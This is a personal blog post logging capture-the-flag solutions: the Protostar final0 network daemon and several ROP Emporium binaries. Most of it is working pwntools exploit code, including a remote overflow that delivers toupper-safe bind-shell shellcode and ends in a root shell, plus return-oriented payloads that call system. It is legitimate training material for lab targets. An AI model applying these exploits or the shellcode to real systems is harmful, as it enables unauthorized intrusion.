---
layout: post
title:  "Protostar & Ropemporium Day Four"
date:   2020-07-04 20:05:48 +0100
categories: pwn
---

Here is day 4 of the 30 days of pwn journey. Today I will be trying to exploit the "Final" protostar challenges found [here](https://exploit-exercises.lains.space/protostar/).


## Final0
```
#include "../common/common.c"

#define NAME "final0"
#define UID 0
#define GID 0
#define PORT 2995

/*
 * Read the username in from the network
 */

char *get_username()
{
  char buffer[512];
  char *q;
  int i;

  memset(buffer, 0, sizeof(buffer));
  gets(buffer);

  /* Strip off trailing new line characters */
  q = strchr(buffer, '\n');
  if(q) *q = 0;
  q = strchr(buffer, '\r');
  if(q) *q = 0;

  /* Convert to lower case */
  for(i = 0; i < strlen(buffer); i++) {
      buffer[i] = toupper(buffer[i]);
  }

  /* Duplicate the string and return it */
  return strdup(buffer);
}

int main(int argc, char **argv, char **envp)
{
  int fd;
  char *username;

  /* Run the process as a daemon */
  background_process(NAME, UID, GID); 
  
  /* Wait for socket activity and return */
  fd = serve_forever(PORT);

  /* Set the client socket to STDIN, STDOUT, and STDERR */
  set_io(fd);

  username = get_username();
  
  printf("No such user %s\n", username);
}
```
The first challenge in the "final" section is a step up from the stack challenges before. Here we will need to check the dump files that are written into /tmp with gdb to be able to fuzz for an offset.

After some fuzzing on the binary, it can be seen that the offset needed is 532 bytes.

Now we can use a call eax gadget to call our shellcode for this challenge.

`ROPgadget --binary final0 | grep "call eax"`
```
0x08048d5f : call eax
```
Now we have call eax we can find a suitable payload for this exploit.

After googling "toUpper" shellcodes I came across one found [here](https://www.exploit-db.com/exploits/13427).

This shellcode will start a bind tcp shell on "127.0.0.1 5074" which we can connect to after we run the exploit.

### Exploit Code
```
from pwn import *

r = remote("10.10.10.21", 2995)

nop_slide = "\x90"
offset = 532
call_eax = p32(0x8048d5f)
shell_code = "\xeb\x02\xeb\x05\xe8\xf9\xff\xff\xff\x5f\x81\xef\xdf\xff\xff\xff\x57\x5e\x29\xc9\x80\xc1\xb8\x8a\x07\x2c\x41\xc0\xe0\x04\x47\x02\x07\x2c\x41\x88\x06\x46\x47\x49\xe2\xedDBMAFAEAIJMDFAEAFAIJOBLAGGMNIADBNCFCGGGIBDNCEDGGFDIJOBGKBAFBFAIJOBLAGGMNIAEAIJEECEAEEDEDLAGGMNIAIDMEAMFCFCEDLAGGMNIAJDIJNBLADPMNIAEBIAPJADHFPGFCGIGOCPHDGIGICPCPGCGJIJODFCFDIJOBLAALMNIA"

payload = shell_code + nop_slide * (offset - len(shell_code)) + call_eax
print(payload)
r.sendline(payload)
```
Connecting to the root session after running the exploit.
```
user@protostar:~$ id;hostname
uid=1001(user) gid=1001(user) groups=1001(user)
protostar
user@protostar:~$ nc 127.0.0.1 5074
id;hostname
uid=0(root) gid=0(root) groups=0(root)
protostar
```

## Ropemporium
The next step on the 30 days of pwn is to learn the challenges at [ropemporium](https://ropemporium.com/). There are both 32bit and 64bit challenges and I will try to do both for each challenge.

There is no source code for these challenges, so I will simply be adding in the solved code and explaining anything that seems interesting.
## ret2win32

### Exploit Code
```
from pwn import *
offset = 'A' * 44
flag = p32(0x08048659)
binary = './ret2win32'
exit = p32(0xf7e02360)
payload = offset + flag + exit

f = open('buf', 'w')
f.write(payload)
```
## ret2win

### Exploit Code
```
from pwn import * 
buffer = 'A' * 40
rip = p32(0x0000000000400811)
payload = buffer + rip

f = open('buf', 'w')
f.write(payload)
```

## split32

### Exploit Code
```
from pwn import *
offset = 'A' * 44
binary_base = 0x8048000
system = p32(0x8048430)
bin_cat = p32(0x0804a030)
#FINDING THE STRING
#To find the string for this challenge, the command used was: "rabin2 -z split32"
#This shows all ascii data inside the binary so we can locate the "/bin/cat flag.txt" to beat the challenge
payload = offset + system + "AAAA" + bin_cat

f = open('buf', 'w')
f.write(payload)
```

## split

### Exploit Code
```
from pwn import *

buffer = 'A' * 40
bin_cat = p64(0x00601060)
gadget = p64(0x400883)
#Gadget used here is a 'pop rdi ; ret' gadget.
system = p64(0x400810)
payload = buffer + gadget + bin_cat + system

f = open('buf', 'w')
f.write(payload)
```

## callme32

### Exploit Code
```
from pwn import *
buffer = 'A' * 44

binary = ELF('./callme32')

one = p32(0x1)
two = p32(0x2)
three = p32(0x3)
pwnme = p32(binary.symbols.pwnme)
params = one + two + three

payload1 = buffer + p32(binary.symbols.callme_one) + pwnme + params
payload2 = buffer + p32(binary.symbols.callme_two) + pwnme + params
payload3 = buffer + p32(binary.symbols.callme_three) + p32(0x41414141) + params

p = process('./callme32')
p.sendline(payload1)
log.info('sending first payload')
p.sendline(payload2)
log.info('sending second payload')
p.sendline(payload3)
log.info('sending final payload')
p.recv(139)
log.success('Flag Found (: ' + p.recv())
```

## callme

### Exploit Code
```
from pwn import *

buffer = 'A' * 40
binary = context.binary = ELF('./callme')

pop_variables = p64(0x00401ab0)
one = p64(0x1)
two = p64(0x2)
three = p64(0x3)

param = pop_variables + one + two + three

payload = ""
payload += buffer
payload += param + p64(binary.symbols.callme_one)
payload += param + p64(binary.symbols.callme_two)
payload += param + p64(binary.symbols.callme_three)

p = process('./callme')
p.recvuntil('> ')
p.send(payload)
p.interactive()
```
